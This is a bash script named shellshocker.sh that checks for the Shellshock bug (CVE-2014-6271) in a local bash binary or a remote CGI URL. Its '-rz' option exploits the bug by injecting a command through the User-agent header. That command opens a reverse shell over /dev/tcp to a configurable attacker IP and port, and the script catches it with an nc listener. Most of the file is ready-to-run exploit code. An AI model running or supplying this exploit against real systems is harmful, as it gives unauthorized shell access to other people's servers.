#/bin/bash

function usage(){
#        printf "Usage:\n"
	printf "Local scan\n"
        printf "bash shellshocker.sh -l bash\n"
        printf "bash shellshocker.sh -l /usr/bin/bash\n"
        printf "bash shellshocker.sh -l ./bash\n\n"
	printf "Remote scan\n"
	printf "bash shellshocker.sh -r <target url>\n"
        printf "\nRemote scan exploit option:\n"
        printf "%s\n\n" "-rz         spawn a shell if can shellshock"
        printf "Example:\n"
        printf "bash shellshocker.sh -r http://ghost.server/cgi-bin/cgi.sh\n"
        printf "bash shellshocker.sh -rz http://ghost.server/cgi-bin/cgi.sh\n"
	exit


}

function local_scan(){

	$bash_program --version | grep version | grep -v Licen
	printf "\n[\e[0;33m*\e[0m] Checking shellshock vulnerability for Bash versions lower than 4.3.*\n"

	env x='() { :;}; printf "[\e[0;32m+\e[0m] \e[1mShellshock Vulnerability found [ CVE-2014-6271 ]\e[0m\n"' $bash_program -c "printf \"[\e[0;33m!\e[0m] End, ignore empty\""
}

function remote_scan(){
	curl -H "User-agent: () { :;}; echo; echo [+] Shellshock Vulnerable;echo;" "$targethost"
}

function spawnshell(){

        curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1" "$targethost" &
        nc -lvp $attacker_port
}

attacker_ip="10.0.2.15"       # change me
attacker_port="4444"          # change me

targethost="$2"
bash_program="$2"

if [[ -z "$1" ]] || [[ -z "$2" ]]
then
	usage
	exit
fi

if [[ "$1" == -l ]];
then
	local_scan "$2"
fi

if [[ "$1" == -r ]]
then
	remote_scan "$2"
fi

if [[ "$1" == '-rz' ]]
then
        remote_scan "$2"
	spawnshell
fi
